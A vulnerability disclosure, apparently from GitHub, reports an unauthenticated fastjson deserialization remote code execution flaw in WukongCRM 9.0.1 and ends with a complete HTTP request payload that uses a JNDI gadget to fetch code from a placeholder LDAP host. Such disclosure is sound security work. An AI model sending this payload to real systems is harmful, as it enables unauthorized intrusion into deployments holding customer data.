# Project
Address: [WukongCRM-9.0-JAVA](https://github.com/WuKongOpenSource/WukongCRM-9.0-JAVA)

Version: [72crm_9.0.1_20191202](https://github.com/WuKongOpenSource/WukongCRM-9.0-JAVA/releases/tag/v9.0.1_20191202)

# 1.Remote code execution vulnerability
  In version 72crm_9.0.1_20191202, insecure components are used, which causes potential remote command execution. Attackers can directly attack the system without authorization.
An insecure version of the fastjson component was used.
![1704868475775](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/17ca0cbc-e735-4baa-83df-3c9d419e8657)
  First we found a vulnerability trigger :
  
http://localhost:8080/CrmCustomer/queryPageList

  The construction method of BasePageRequest is called for processing. In the process of processing, the parseObject() method of fastjson is first called to parse the json string into a java bean. Due to the deserialization vulnerability of this version of fastjson, Attackers just visit: / CrmCustomer/queryPageList, and enter the malicious json string, can trigger a loophole.
![1704868558336](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/306cec15-e820-467b-a272-6616022c2988)
There are many attack modes in version 1.2.54, and only one of them is shown below:

This attack requires the xbean jar package to be introduced and AutoType to be enabled
![1704868582627](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/b9b3fe96-4be3-4897-865b-0bcd90274203)
![1704868589487](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/eb0e81bc-77eb-4666-ae20-006d6ebcf8d6)
Start the attack
![1704868744804](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/90613d47-78a2-40a4-8352-96ea218e6622)
Due to some problems in the authentication logic, the attacker does not even need Admin-Token, and directly launches attacks without authorization.
![1704868628296](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/26df5ce2-b472-48b6-be57-f3f788918521)
Payload :
```
POST /CrmCustomer/queryPageList HTTP/1.1
Host: localhost:8080
Content-Length: 115
Content-Type: application/json;charset=UTF-8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close

{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://ip:port/Basic/Command/calc"}"
```








